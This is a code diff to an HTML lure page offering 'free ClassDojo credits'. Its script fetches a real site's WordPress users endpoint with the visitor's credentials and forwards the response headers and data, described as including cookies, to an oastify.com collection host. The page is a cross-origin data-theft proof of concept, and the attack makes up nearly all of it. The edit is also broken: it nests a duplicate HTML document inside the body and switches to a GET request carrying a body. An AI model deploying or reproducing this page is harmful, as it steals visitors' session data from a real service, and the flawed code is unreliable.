@@ -5,20 +5,34 @@
 </head>
 <body>
   <h1>Click to claim your free credits!</h1>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free ClassDojo Credits!</title>
+</head>
+<body>
+  <h1>Click to claim your free credits!</h1>
 <script>  
-fetch('https://blog.arlo.com/wp-json/wp/v2/users', {  
-  credentials: 'include'  
-})  
-.then(r => {  
+async function fetchData() {
+  const r = await fetch('https://blog.arlo.com/wp-json/wp/v2/users', {  
+    credentials: 'include'  
+  });
+
   // Send FULL request headers to your server (includes cookies!)  
-  fetch('https://og8sn80hf37ay61awew00e0riio9cz0o.oastify.com', {  
-    method: 'POST',  
+  await fetch('https://og8sn80hf37ay61awew00e0riio9cz0o.oastify.com', {  
+    method: 'GET',  
     body: JSON.stringify({  
       headers: [...r.headers.entries()],  
       data: await r.text()  
     })  
-  });  
-});  
+  });
+}
+
+// Run the fetchData function
+fetchData();
 </script>  
+</body>
+</html>
+
 </body>
 </html>
